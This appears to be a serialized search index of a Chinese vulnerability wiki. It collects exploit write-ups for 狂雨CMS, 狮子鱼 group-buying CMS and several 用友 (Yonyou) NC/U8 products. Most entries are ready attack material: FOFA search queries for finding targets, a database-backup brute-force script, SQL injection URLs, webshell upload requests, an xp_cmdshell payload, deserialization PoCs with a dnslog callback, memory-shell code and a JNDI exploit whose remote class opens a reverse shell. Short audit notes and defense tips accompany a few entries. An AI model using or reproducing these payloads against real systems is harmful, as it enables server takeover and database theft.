20:15:02 "},"Web安全/狂雨cms/狂雨CMS后台文件包含getshell/狂雨CMS后台文件包含getshell.html":{"url":"Web安全/狂雨cms/狂雨CMS后台文件包含getshell/狂雨CMS后台文件包含getshell.html","title":"狂雨CMS后台文件包含getshell","keywords":"","body":"狂雨CMS后台文件包含getshell 审计 首先还是先看代码结构 addons 插件代码 application 主要后端代码 config 配置文件 extend 一些基础类文件 public 静态文件 route 路由 runtime 主要是缓存 template 模板文件 thinkphp thinkphp uploads 上传文件 主要的审计中心放在application下 文件包含 主要是提供了可修改模板功能，然后利用thinkphp的模板语法进行文件包含 主要代码 application/admin/controller/Template.php->edit() public function edit(){ $Template=model('template'); $data=$this->request->post(); if($this->request->isPost()){ $res = $Template->edit($data); if($res !== false){ return $this->success('模版文件修改成功！',url('index')); } else { $this->error($Template->getError()); } }else{ $path=urldecode($this->request->param('path')); $info=$Template->file_info($path); $this->assign('path',$path); $this->assign('content',$info); $this->assign('meta_title','修改模版文件'); return $this->fetch(); } } 跟入edit函数 application/admin/model/Template.php->edit() public function edit($data){ return File::put($data['path'],$data['content']); } 继续跟入 extend/org/File.php static public function put($filename,$content,$type=''){ $dir = dirname($filename); if(!is_dir($dir)) mkdir($dir,0755,true); if(false === file_put_contents($filename,$content)){ throw new \\think\\Exception('文件写入错误:'.$filename); }else{ self::$contents[$filename]=$content; return true; } } 可以看到这里没经过任何过滤，直接进行了写入。关于这里的模板功能，肯定还有其他利用方式，就靠师傅们自己去测试了 防御方法 针对该处漏洞的防御，觉得还是对上传进行过滤比较容易，比如说进行内容的检查，或者对图片进行一定的改动譬如缩放，从而破坏图片马的结构，不过只是治标不治本，一旦找到新的上传方式，还是会被利用。 漏洞复现 后台可以修改模板文件，在模板文件中调用模板代码可实现文件包含 首先在设置中上传logo处，上传图片马，需要注意不能是用户的头像上传处上传木马，因为头像会进行缩放，导致文件内容被修改 上传成功后会返回路径，图片马内容为，需要注意php代码必须包含最后的?>，否则会报语法错误 进入模板功能处，在index.html，即主页模板中添加模板代码，同样需要注意，路径不能以/开头，否则会被找不到错误 {include file=\"uploads/config/20200325/033966a7d27975812915522464e252a3.jpg\" /} 接着打开主页，即可看到phpinfo信息 参考 https://www.cnblogs.com/0daybug/p/12624364.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:15:03 "},"Web安全/狂雨cms/狂雨CMS数据库备份地址爆破/狂雨CMS数据库备份地址爆破.html":{"url":"Web安全/狂雨cms/狂雨CMS数据库备份地址爆破/狂雨CMS数据库备份地址爆破.html","title":"狂雨CMS数据库备份地址爆破","keywords":"","body":"狂雨CMS数据库备份地址爆破 审计 application/admin/controller/Database.php->export() public function export($tables = null, $id = null, $start = null){ if($this->request->isPost() && !empty($tables) && is_array($tables)){ //初始化 ...... //生成备份文件信息 $file = [ 'name' => date('Ymd-His', time()), 'part' => 1, ]; ...... //创建备份文件 $Database = new Databasec($file, $config); if(false !== $Database->create()){ $tab = ['id' => 0, 'start' => 0]; $this->success('初始化成功！', '', ['tables' => $tables, 'tab' => $tab]); } else { $this->error('初始化失败，备份文件创建失败！'); } ...... } elseif ($this->request->isGet() && is_numeric($id) && is_numeric($start)) { //备份数据 ...... } else { $this->error('请指定要备份的表！'); } } 跟进Databasec类 extend/databasec/Databasec.php->create() public function __construct($file, $config, $type = 'export'){ $this->file = $file; $this->config = $config; } public function create(){ $sql = \"-- -----------------------------\\n\"; $sql .= \"-- Think MySQL Data Transfer \\n\"; $sql .= \"-- \\n\"; $sql .= \"-- Host : \" . config('database.hostname') . \"\\n\"; $sql .= \"-- Port : \" . config('database.hostport') . \"\\n\"; $sql .= \"-- Database : \" . config('database.database') . \"\\n\"; $sql .= \"-- \\n\"; $sql .= \"-- Part : #{$this->file['part']}\\n\"; $sql .= \"-- Date : \" . date(\"Y-m-d H:i:s\") . \"\\n\"; $sql .= \"-- -----------------------------\\n\\n\"; $sql .= \"SET FOREIGN_KEY_CHECKS = 0;\\n\\n\"; return $this->write($sql); } 继续跟进write函数 extend/databasec/Databasec.php->write() private function write($sql){ $size = strlen($sql); //由于压缩原因，无法计算出压缩后的长度，这里假设压缩率为50%， //一般情况压缩率都会高于50%； $size = $this->config['compress'] ? $size / 2 : $size; $this->open($size); return $this->config['compress'] ? @gzwrite($this->fp, $sql) : @fwrite($this->fp, $sql); } 跟进open函数 extend/databasec/Databasec.php->open() private function open($size){ if($this->fp){ $this->size += $size; if($this->size > $this->config['part']){ $this->config['compress'] ? @gzclose($this->fp) : @fclose($this->fp); $this->fp = null; $this->file['part']++; session('backup_file', $this->file); $this->create(); } } else { $backuppath = $this->config['path']; $filename = \"{$backuppath}{$this->file['name']}-{$this->file['part']}.sql\"; if($this->config['compress']){ $filename = \"{$filename}.gz\"; $this->fp = @gzopen($filename, \"a{$this->config['level']}\"); } else { $this->fp = @fopen($filename, 'a'); } $this->size = filesize($filename) + $size; } } 可以看到文件名由file['name']+-+file['part']+.sql(.gz)组成，name是格式化后的time，part为1，因此可直接爆破文件名，从而泄露数据库 防御方法 利用随机数生成文件名，然后发送邮件至管理员邮箱或发送短信至手机，增加爆破难度 漏洞复现 后台可以直接备份数据库，备份后为.sql.gz文件(可以在设置里更改是否压缩)，文件名为time函数生成的时间戳，可直接爆破进行下载，这里先附上exp(因为不会进行验证码的识别，所以修改了代码将验证部分注释掉了，师傅们见谅~) Python爆破脚本 # !/usr/bin/python3 # -*- coding:utf-8 -*- # author: Forthrglory import requests import time def getDatabase(url,username, password): session = requests.session() u = 'http://%s/admin/index/login.html' % (url) head = { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' } data = { 'username': username, 'password': password, 'code': 1 } session.post(u, data, headers = head) u = 'http://%s/admin/database/export.html' % (url) data = { 'layTableCheckbox':'on', 'tables[0]':'ky_ad', 'tables[1]':'ky_addons', 'tables[2]':'ky_bookshelf', 'tables[3]':'ky_category', 'tables[4]':'ky_collect', 'tables[5]':'ky_comment', 'tables[6]':'ky_config', 'tables[7]':'ky_crontab', 'tables[8]':'ky_link', 'tables[9]':'ky_member', 'tables[10]':'ky_menu', 'tables[11]':'ky_news', 'tables[12]':'ky_novel', 'tables[13]':'ky_novel_chapter', 'tables[14]':'ky_route', 'tables[15]':'ky_slider', 'tables[16]':'ky_template', 'tables[17]':'ky_user', 'tables[18]':'ky_user_menu' } t = time.strftime(\"%Y%m%d-%H%M%S\", time.localtime()) session.post(u, data = data) for i in range(0, 19): u2 = 'http://%s/admin/database/export.html?id=%s&start=0' % (url, str(i)) session.get(u2) t = 'http://' + url + '/public/database/' + t + '-1.sql.gz' return t if __name__ == '__main__': u = '127.0.0.1' username = 'admin' password = 'admin' t = getDatabase(u, username, password) print(t) 运行代码，得到路径(默认生成路径为/public/database/，可在设置中修改) 直接访问下载 可以看到所有数据库信息全在了 参考 https://www.cnblogs.com/0daybug/p/12624364.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:15:04 "},"Web安全/狮子鱼社区团购系统/狮子鱼社区团购系统CMS存在两处SQL注入/狮子鱼社区团购系统CMS存在两处SQL注入.html":{"url":"Web安全/狮子鱼社区团购系统/狮子鱼社区团购系统CMS存在两处SQL注入/狮子鱼社区团购系统CMS存在两处SQL注入.html","title":"狮子鱼社区团购系统CMS存在两处SQL注入","keywords":"","body":"狮子鱼社区团购系统CMS存在两处SQL注入 漏洞描述 狮子鱼社区团购系统CMS存在SQL注入 漏洞影响 狮子鱼社区团购系统 FOFA \"/seller.php?s=/Public/login\" 代码审计 SQL注入（1） http://localhost/index.php?s=api/goods/get_goods_detail&id=1* id为注入参数 SQL注入（2） http://localhost/index.php?s=api/goods_detail&goods_id=1* id为注入参数 直接sqlmap梭哈： Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:15:06 "},"Web安全/狮子鱼社区团购系统/狮子鱼社区团购系统CMS存在两处文件上传漏洞/狮子鱼社区团购系统CMS存在两处文件上传漏洞.html":{"url":"Web安全/狮子鱼社区团购系统/狮子鱼社区团购系统CMS存在两处文件上传漏洞/狮子鱼社区团购系统CMS存在两处文件上传漏洞.html","title":"狮子鱼社区团购系统CMS存在两处文件上传漏洞","keywords":"","body":"狮子鱼社区团购系统CMS存在两处任意文件上传 漏洞描述 狮子鱼社区团购系统CMS存在任意文件上传 漏洞影响 狮子鱼社区团购系统 FOFA 未测 漏洞复现 任意文件上传（1） POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/1.1 Host: 192.168.3.7 Content-Length: 213 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundary8UaANmWAgM4BqBSs Content-Disposition: form-data; name=\"files\"; filename=\"qingy.php\" Content-Type: image/gif ------WebKitFormBoundary8UaANmWAgM4BqBSs— 任意文件上传（2） POST /wxapp.php?controller=Goods.doPageUpload HTTP/1.1 Host: 192.168.3.7 Content-Length: 214 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundary8UaANmWAgM4BqBSs Content-Disposition: form-data; name=\"upfile\"; filename=\"qingy.php\" Content-Type: image/gif ------WebKitFormBoundary8UaANmWAgM4BqBSs-- Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:15:08 "},"Web安全/用友 NC Cloud/用友 NCCloud FS文件管理SQL注入/用友 NCCloud FS文件管理SQL注入.html":{"url":"Web安全/用友 NC Cloud/用友 NCCloud FS文件管理SQL注入/用友 NCCloud FS文件管理SQL注入.html","title":"用友 NCCloud FS文件管理SQL注入","keywords":"","body":"用友 NCCloud FS文件管理SQL注入 漏洞描述 用友 NCCloud FS文件管理登录页面对用户名参数没有过滤，存在SQL注入 漏洞影响 用友 NCCloud FOFA \"NCCloud\" 漏洞描述 登录页面如下 在应用中存在文件服务器管理登录页面 http://xxx.xxx.xxx.xxx/fs/ 登录请求包如下 GET /fs/console?username=123&password=%2F7Go4Iv2Xqlml0WjkQvrvzX%2FgBopF8XnfWPUk69fZs0%3D HTTP/1.1 Host: xxx.xxx.xxx.xxx Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: JSESSIONID=2CF7A25EE7F77A064A9DA55456B6994D.server; JSESSIONID=0F83D6A0F3D65B8CD4C26DFEE4FCBC3C.server x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close 使用Sqlmap对username参数 进行SQL注入 sqlmap -r sql.txt -p username Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:15:25 "},"Web安全/用友 NC Cloud/用友NC Cloud Sql注入漏洞/用友NC Cloud Sql注入漏洞.html":{"url":"Web安全/用友 NC Cloud/用友NC Cloud Sql注入漏洞/用友NC Cloud Sql注入漏洞.html","title":"用友NC Cloud Sql注入漏洞","keywords":"","body":"用友NC Cloud Sql注入漏洞 漏洞描述 攻击者构造恶意SQL语句未授权获取后台敏感数据。 漏洞影响 NC Cloud FOFA \"NCCloud\" POC /fs/console?username=admin&password=123456 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:15:27 "},"Web安全/用友GRP-u8/用友GRP-u8 SQL注入/用友GRP-u8 SQL注入.html":{"url":"Web安全/用友GRP-u8/用友GRP-u8 SQL注入/用友GRP-u8 SQL注入.html","title":"用友GRP-u8 SQL注入","keywords":"","body":"用友GRP-u8 SQL注入 POST /Proxy HTTP/1.1 Accept: Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host Content-Length: 357 Connection: Keep-Alive Cache-Control: no-cache cVer=9.8.0&dp=XMLAS_DataRe questProviderNameDataSetProviderDataDataexec xp_cmdshell 'net user' Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:15:10 "},"Web安全/用友nc/用友 NC bsh.servlet.BshServlet 远程命令执行漏洞/用友 NC bsh.servlet.BshServlet 远程命令执行漏洞.html":{"url":"Web安全/用友nc/用友 NC bsh.servlet.BshServlet 远程命令执行漏洞/用友 NC bsh.servlet.BshServlet 远程命令执行漏洞.html","title":"用友 NC bsh.servlet.BshServlet 远程命令执行漏洞","keywords":"","body":"用友 NC bsh.servlet.BshServlet 远程命令执行漏洞 漏洞描述 用友 NC bsh.servlet.BshServlet 存在远程命令执行漏洞，通过BeanShell 执行远程命令获取服务器权限 漏洞影响 用友NC FOFA icon_hash=\"1085941792\" 漏洞复现 首先访问如下页面： 漏洞URL为： /servlet/~ic/bsh.servlet.BshServlet 在该界面只需要把print换成exec函数即可命令执行。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:15:22 "},"Web安全/用友nc/用友 NC XbrlPersistenceServlet反序列化/用友 NC XbrlPersistenceServlet反序列化.html":{"url":"Web安全/用友nc/用友 NC XbrlPersistenceServlet反序列化/用友 NC XbrlPersistenceServlet反序列化.html","title":"用友 NC XbrlPersistenceServlet反序列化","keywords":"","body":"用友 NC XbrlPersistenceServlet反序列化 漏洞描述 用友 NC XbrlPersistenceServlet反序列化漏洞 漏洞影响 目前测试影响版本：nc6.5 漏洞复现 攻击队利用用友nc反序列利用 漏洞url为： /service/~xbrl/XbrlPersistenceServlet poc： import requests import threadpool import urllib3 import sys import base64 ip = \"\" dnslog = \"\\x79\\x37\\x64\\x70\\\" #dnslog把字符串转16进制替换该段，测试用的ceye.io可以回显 data = \"\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48\\x61\\x73\\x68\\x4d\\x61\\x70\\x05\\x07\\xda\\xc1\\xc3\\x16\\x60\\xd1\\x03\\x00\\x02\\x46\\x00\\x0a\\x6c\\x6f\\x61\\x64\\x46\\x61\\x63\\x74\\x6f\\x72\\x49\\x00\\x09\\x74\\x68\\x72\\x65\\x73\\x68\\x6f\\x6c\\x64\\x78\\x70\\x3f\\x40\\x00\\x00\\x00\\x00\\x00\\x0c\\x77\\x08\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x01\\x73\\x72\\x00\\x0c\\x6a\\x61\\x76\\x61\\x2e\\x6e\\x65\\x74\\x2e\\x55\\x52\\x4c\\x96\\x25\\x37\\x36\\x1a\\xfc\\xe4\\x72\\x03\\x00\\x07\\x49\\x00\\x08\\x68\\x61\\x73\\x68\\x43\\x6f\\x64\\x65\\x49\\x00\\x04\\x70\\x6f\\x72\\x74\\x4c\\x00\\x09\\x61\\x75\\x74\\x68\\x6f\\x72\\x69\\x74\\x79\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x04\\x66\\x69\\x6c\\x65\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x04\\x68\\x6f\\x73\\x74\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x08\\x70\\x72\\x6f\\x74\\x6f\\x63\\x6f\\x6c\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x03\\x72\\x65\\x66\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x50\\x74\\x00\\x11\"+dnslog+\"\\x3a\\x38\\x30\\x74\\x00\\x00\\x74\\x00\\x0e\"+dnslog+\"\\x74\\x00\\x04\\x68\\x74\\x74\\x70\\x70\\x78\\x74\\x00\\x18\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\"+dnslog+\"\\x3a\\x38\\x30\\x78\" uploadHeader={\"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\"} req = requests.post(\"http://+\"ip\"+/service/~xbrl/XbrlPersistenceServlet\", headers=uploadHeader, verify=False, data=data, timeout=25) print (req.text) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:15:23 "},"Web安全/用友nc/用友 NC 反序列化RCE漏洞/用友 NC 反序列化RCE漏洞.html":{"url":"Web安全/用友nc/用友 NC 反序列化RCE漏洞/用友 NC 反序列化RCE漏洞.html","title":"用友 NC 反序列化RCE漏洞","keywords":"","body":"用友 NC 反序列化RCE漏洞 漏洞描述 用友NC 存在反序列化 RCE漏洞，攻击者可利用控制服务器 漏洞影响 [!NOTE] 用友 NC 漏洞复现 首先从任意文件上传说起 任意文件上传分析代码在servlet.FileReceiveServlet。在这里我们可以看到，从请求中读取流，然后转换为map类型并读取上传文件的路径。然后再读取待上传的文件。 而网上很多poc，大多都是基于此漏洞，利用反序列化上传一个文件到服务器。 这也就是去年的那个任意文件上传的反序列化漏洞。但是，但是，这个漏洞本质是一个反序列化漏洞。而且某C的classpath中，也存在apache commonscollections库，我们可以利用这个库，直接执行命令或者内存马。岂不是比任意文件上传舒服多了。 内存马 老样子，在反序列化中想执行任意代码，一般都依靠xalan这个库。这次也不例外。 植入内存马，关键在于我们怎样找到context，只有找到context，我们才可以添加filter。好在某c中，我们只需要通过下面的代码既可以获取当前context，不需要从tomcat中获取context Object obj = 改动Locator.getInstance().lookup(\"ServletContext\"); Field contextField = obj.getClass().getDeclaredField(\"context\"); contextField.setAccessible(true); obj = contextField.get(obj); Field contextField1 = obj.getClass().getDeclaredField(\"context\"); contextField1.setAccessible(true); addFitlertoTomcat(contextField1.get(obj)); 剩下的就是常规操作，可以看我之前的内存马模型，基本不需要很大的改动即可完美适配。 回显 我们只需要找到这样一个servlet，即存在反序列化的readObject，又将错误信息写入到response中 不难看出 uploadServlet 就很满足这个需求。 out = new ObjectOutputStream(output); in = new ObjectInputStream(request.getInputStream()); String dsName = (String)in.readObject(); } } catch (Exception var14) { var14.printStackTrace(); if (out == null) { throw new ServletException(var14); } out.writeObject(var14); 如果出错的话，将错误信息通过序列化写入到response中。好处在于，我们不需要麻烦的去找tomcat的response对象。 所以，我们将反序列化的payload，发送给uploadServlet即可。然后我们只需要读取响应，即可拿到服务器命令执行的回显结果。客户端代码可以这样写 ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(r)); Exception e = (Exception) objectInputStream.readObject(); Object obj = e.getCause(); Field targetF = obj.getClass().getDeclaredField(\"target\"); targetF.setAccessible(true); obj = targetF.get(obj); Field msgF = obj.getClass().getSuperclass().getDeclaredField(\"detailMessage\"); msgF.setAccessible(true); String msg = msgF.get(obj).toString(); System.out.println(msg); 参考文章 https://mp.weixin.qq.com/s/IdXYbjNVGVIasuwQH48Q1w Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:15:24 "},"Web安全/用友nc/用友ERP-NC 目录遍历漏洞/用友ERP-NC 目录遍历漏洞.html":{"url":"Web安全/用友nc/用友ERP-NC 目录遍历漏洞/用友ERP-NC 目录遍历漏洞.html","title":"用友ERP-NC 目录遍历漏洞","keywords":"","body":"用友ERP-NC 目录遍历漏洞 漏洞描述 用友ERP-NC 存在目录遍历漏洞，攻击者可以通过目录遍历获取敏感文件信息 漏洞影响 [!NOTE] 用友ERP-NC FOFA [!NOTE] app=\"用友-UFIDA-NC\" 漏洞复现 POC为 /NCFindWeb?service=IPreAlertConfigService&filename= 查看 ncwslogin.jsp 文件 Goby & POC [!NOTE] YongYou ERP-NC directory traversal Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:15:11 "},"Web安全/用友nc/用友nc 6.5 反序列化漏洞/用友nc 6.5 反序列化漏洞.html":{"url":"Web安全/用友nc/用友nc 6.5 反序列化漏洞/用友nc 6.5 反序列化漏洞.html","title":"用友nc 6.5 反序列化漏洞","keywords":"","body":"用友nc 6.5 反序列化漏洞 一、漏洞简介 二、漏洞影响 用友nc 6.5 三、复现过程 环境搭建 1.执行NC安装包根目录下setup.bat文件（要求安装盘同级目下有ufjdk文件或者设置JAVA_HOME环境变量），安装时，出现如下图界面; 2.选择安装的产品，这里我只安装了部分与NC相关的模块。下面对NC产品模块做个简要说明; nc_uap 客户化 nc_portal 企业门户 nc_pd 工程基础数据 nc_fi 财务会计 nc_tpb 全面计划预算 nc_co_cm 管理会计 nc_tm 资金管理 nc_scm 供应链管理 nc_qc 质量管理 nc_am 资产管理 nc_mm 生产制造 nc_hr 人力资源 nc_hr_pd 人力资源预制 nc_iufo 网络报表含合并报表 nc_xbrl 集团报表XBRL 3.至此NC已安装完成，接下来创建Oracle用户; SQL> create user NCV6.5 identified by 1 default tablespace nnc_data01 temporary tablespace temp; SQL> grant dba,connect to NCV6.5; 4.配置sysConfig，产品安装完成之后会自动进入系统配置界面; 服务器类型选择UAP SERVER。点击服务器信息→读取，如下图： 进入\"数据源页签\"→\"读取\"→\"添加\",将NC V6.5作为账套数据源，数据库类型选择ORACLE11G，添加数据源名称，不能包含中文。配置数据库地址、用户名密码、失效链接检查周期、prepareStatement缓存数等信息，完成后点击测试，如果提示测试通过则表示NC能够与数据库连通，保存即可。 进入\"安全日志数据源页签\"→\"读取\"，初始化数据源，初始化完成后点击\"确定\"。 进入\"部署\"→\"全选\"→\"部署EJB\"， 此处用于生成、部署EJB，如下图所示： 进入\"文件服务器\"→\"读取\"，此处添加服务器ip地址，端口，存储路径，及选择元数据仓库,如下图所示： 5.环境搭建完成。因为通过浏览器访问的方式需要依赖不同用户设备上的Java版本以及系统配置等环境因素，所以为了避免这些不必要的麻烦，可以使用专用浏览器UClient来解决此问题。 漏洞分析 下载UClient并安装后，进入启动页面，选择添加应用。 在其安装目录里发现了NCLogin65.jar，通过对其反编译进行查看发现，它里面只是一些界面和登录逻辑代码，主要的通信代码并不在该jar包中。 继续在其他目录下的寻找，发现该目录(nc_client_home\\NCCACHE\\CODE)中的子目录含有许多jar包，其中external目录中的jar包是负责客户端与服务端之间通信的逻辑代码。 通过对登录流程的动态调试，最后找到了对应的类(nc.login.ui.LoginUISuppor)，并定位到该类中处理登录请示的方法(getLoginRequest()) 执行getInstance()，获取NCLocator的实例，然后执行NCLocator实例的lookup()方法 查看nc.bs.framework.common.NCLocator#getInstance(java.util.Properties) //nc.bs.framework.common.NCLocator#getInstance locator = (NCLocator)locatorMap.get(key); if (locator != null) { return locator; } else { if (!isEmpty(locatorProvider)) { locator = newInstance(locatorProvider); } else if (!isEmpty(svcDispatchURL)) { locator = newInstance(\"nc.bs.framework.rmi.RmiNCLocator\"); } else { locator = getDefaultLocator(); } locator.init(props); locatorMap.put(key, locator); return locator; } 由于程序刚启动的时候locatorMap的值为空，则会进入下面的分支语句中去判断locatorProvider值，而此时又因为locatorProvider的值为空，svcDispatchURL的值(http://ip:port/ServiceDispatcherServlet)不为空，所以会创建RmiNCLocator实例，将其存放至locatorMap中。获取到RmiNCLocator实例后，查看其lookup()方法： 继续跟进nc.bs.framework.server.RemoteMetaContext#lookup()： 从proxyMap中查看是否存在参数name，如果存在则直接返回，不存在则进入下面的分支。查看getMetaOnDemand()方法： 可以看到当metaV0值为空的时候，又调用了this.remoteMetaContext.lookup()方法，在当前类中搜索remoteMetaContext，发现在类构造函数中创建了一个代理并将其赋值到this.remoteMetaContext： //nc.bs.framework.rmi.RemoteContextStub#RemoteContextStub public RemoteContextStub(String dispatchURL, String module) throws ComponentException { ComponentMetaVO metaVO = new ComponentMetaVO(); metaVO.setInterfaces(new String[]{Context.class.getName()}); if (module != null) { metaVO.setModule(module); metaVO.setName(\"nc.bs.framework.server.RemoteMetaContext.\" + module); } else { metaVO.setName(\"nc.bs.framework.server.RemoteMetaContext\"); } this.namedMetasMap.put(metaVO.getName(), metaVO); Address url = null; try { url = new Address(dispatchURL); } catch (MalformedURLException var6) { throw new ComponentException(\"invalid url: \" + dispatchURL); } this.defRas = new SimpleRemoteAddressSelector(url); this.remoteMetaContext = (Context)RemoteProxyFactory.getDefault().createRemoteProxy(RemoteContextStub.class.getClassLoader(), metaVO, this.defRas); this.proxyMap.put(metaVO.getName(), this.remoteMetaContext); this.dispatchUrl = url; this.module = module; this.init(); } 通过java代理的相关知识可以知道，无论调用代理对象的任何方法，该方法都会调用处理器的invoke方法，在本程序中即是nc.bs.framework.rmi.RemoteInvocationHandler#invoke： //nc.bs.framework.rmi.RemoteInvocationHandler#invoke public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { String mn = method.getName(); Class[] ps = method.getParameterTypes(); if (mn.equals(\"equals\") && ps.length == 1 && ps[0].equals(Object.class)) { Object value = args[0]; if (value != null && Proxy.isProxyClass(value.getClass())) { Object h = Proxy.getInvocationHandler(value); return !(h instanceof RemoteInvocationHandler) ? Boolean.FALSE : this.meta.equals(((RemoteInvocationHandler)h).meta) && this.ras.equals(((RemoteInvocationHandler)h).ras); } else { return Boolean.FALSE; } } else if (mn.equals(\"hashCode\") && ps.length == 0) { return this.meta.hashCode() + 27 * this.ras.hashCode(); } else if (mn.equals(\"toString\") && ps.length == 0) { return this.meta.toString(); } else { return method.getDeclaringClass() == RemoteProxy.class ? method.invoke(this, args) : this.sendRequest(method, args); } } 此时mn的值为\"lookup\"，因此会进入最后一条分支语句中，又因为二者不等，最终会执行this.sendRequest(method, args)方法 //nc.bs.framework.rmi.RemoteInvocationHandler#sendRequest public Object sendRequest(Method method, Object[] args) throws Throwable { InvocationInfo ii = this.newInvocationInfo(method, args); Address old = null; int retry = 0; ConnectorFailException error = null; do { Address target = this.ras.select(); if (old != null) { Logger.error(\"connect to: \" + old + \" failed, now retry connect to: \" + target); if (old.equals(target)) { try { Thread.sleep(this.retryInterval); } catch (Exception var13) { ; } } } this.restoreToken(ii, target); try { Object var8 = this.sendRequest(target, ii, method, args); return var8; } catch (ConnectorFailException var14) { ++retry; old = target; error = var14; } finally { this.storeToken(ii, target); } } while(retry 跟进this.sendRequest(target, ii, method, args)： 可以看到该方法中将 ii 序列化输出，发送到服务端，然后获取服务端返回的反序列化结果并回显到客户端。 poc explpit.java import nc.bs.framework.common.NCLocator; import java.util.Properties; public class poc { public static void attack(String url, String jndipath) { Properties env = new Properties(); if (!url.startsWith(\"http\")) { url = \"http://\" + url; } env.put(\"SERVICEDISPATCH_URL\", url + \"/ServiceDispatcherServlet\"); NCLocator locator = NCLocator.getInstance(env); locator.lookup(jndipath); } public static void main(String[] args) { attack(\"http://target\", \"ldap://ip:port/classname\"); } } remote.java import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.Serializable; import java.util.Hashtable; public class remote implements ObjectFactory, Serializable { public remote() { try{ java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"sh -i >& /dev/tcp/ip/port 0>&1\"}); } catch (Exception e) { e.printStackTrace(); } } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws Exception { return null; } } 当然也可以选择利用 nc 自带的类进行远程部署利用 import nc.bs.framework.common.ComponentMetaVO; import nc.bs.framework.rmi.RemoteAddressSelector; import nc.bs.framework.rmi.RemoteProxy; public class remote implements RemoteProxy { public remote() { try{ java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"sh -i >& /dev/tcp/ip/port 0>&1\"}); } catch (Exception e) { e.printStackTrace(); } } @Override public Object getAttribute(String s) { return null; } @Override public void setAttribute(String s, Object o) { } @Override public ComponentMetaVO getComponentMetaVO() { return null; } @Override public int getRetryMax() { return 0; } @Override public void setRetryMax(int i) { } @Override public long getRetryInterval() { return 0; } @Override public void setRetryInterval(long l) { } @Override public void setRemoteAddressSelector(RemoteAddressSelector remoteAddressSelector) { } @Override public RemoteAddressSelector getRemoteAddressSelector() { return null; } } 参考链接 https://xz.aliyun.com/t/8242 https://blog.sari3l.com/posts/608d18f0/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:15:16 "},"Web安全/用友U8/用友 U8 OA test.jsp SQL注入漏洞/用友 U8 OA test.jsp SQL注入漏洞.html":{"url":"Web安全/用友U8/用友 U8 OA test.jsp SQL注入漏洞/用友 U8 OA test.jsp SQL注入漏洞.html","title":"用友 U8 OA test.jsp SQL注入漏洞","keywords":"","body":"用友 U8 OA test.jsp SQL注入漏洞 漏洞描述 用友 U8 OA test.jsp文件存在 SQL注入漏洞，由于与致远OA使用相同的文件，于是存在了同样的漏洞 漏洞影响 用友 U8 OA FOFA \"用友U8-OA\" 漏洞复现 可参考 文章 致远OA A6 test.jsp SQL注入漏洞 登录页面如下 POC 